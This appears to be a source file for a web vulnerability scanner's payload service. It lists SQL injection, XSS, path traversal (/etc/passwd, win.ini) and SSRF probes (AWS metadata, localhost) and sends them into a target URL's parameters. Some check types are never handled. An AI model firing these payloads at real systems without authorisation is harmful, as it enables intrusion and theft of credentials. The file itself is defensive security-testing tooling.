import { Injectable, Logger } from '@nestjs/common';
import axios from 'axios';

@Injectable()
export class PayloadService {
  private readonly logger = new Logger(PayloadService.name);

  /**
   * Safe payloads for ethical hacking.
   * These are designed to trigger responses that indicate a vulnerability 
   * without causing destructive data loss or denial of service.
   */
  getPayloads() {
    return {
      sqli: [
        { name: 'Time Delay (MySQL)', payload: "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) --", checkType: 'delay' },
        { name: 'Boolean Based (Generic)', payload: "' OR 1=1 --", checkType: 'content' },
        { name: 'Error Based (Postgres)', payload: "' AND 1=(SELECT(COUNT(*)) FROM pg_sleep(5)) --", checkType: 'delay' }
      ],
      xss: [
        { name: 'Script Reflection', payload: "<script>confirm('Aegis-Security-Audit')</script>", checkType: 'reflection' },
        { name: 'SVG OnLoad', payload: "<svg/onload=confirm('XSS')>", checkType: 'reflection' },
        { name: 'Iframe Injection', payload: "<iframe src=\"javascript:alert(1)\">", checkType: 'reflection' }
      ],
      lfi: [
        { name: 'Linux Passwd', payload: '../../../../etc/passwd', checkType: 'pattern', match: /root:x:0:0/ },
        { name: 'Windows Win.ini', payload: 'C:\\Windows\\win.ini', checkType: 'pattern', match: /\[extensions\]/ }
      ],
      ssrf: [
        { name: 'AWS Metadata', payload: 'http://169.254.169.254/latest/meta-data/', checkType: 'content' },
        { name: 'Localhost Probe', payload: 'http://localhost:80', checkType: 'status_change' }
      ]
    };
  }

  /**
   * Executes a safe probe against a specific URL and parameter.
   */
  async executeProbe(url: string, parameter: string, payload: any) {
    const startTime = Date.now();
    const targetUrl = new URL(url);
    targetUrl.searchParams.set(parameter, payload.payload);

    try {
      const response = await axios.get(targetUrl.toString(), {
        timeout: 10000,
        validateStatus: () => true,
        headers: { 'User-Agent': 'AegisCyber-Security-Scanner/1.0' }
      });

      const duration = Date.now() - startTime;

      // Logic for detecting vulnerability
      if (payload.checkType === 'delay' && duration >= 5000) {
        return { vulnerable: true, evidence: `Confirmed via timing attack (${duration}ms response delay)` };
      }

      if (payload.checkType === 'reflection' && response.data.includes(payload.payload)) {
        return { vulnerable: true, evidence: `Payload reflected exactly in HTTP response body.` };
      }

      if (payload.checkType === 'pattern' && payload.match.test(response.data)) {
        return { vulnerable: true, evidence: `Matched sensitive file pattern: ${payload.match}` };
      }

      return { vulnerable: false };
    } catch (e) {
      this.logger.error(`Probe failed for ${targetUrl}: ${e.message}`);
      return { vulnerable: false, error: e.message };
    }
  }
}
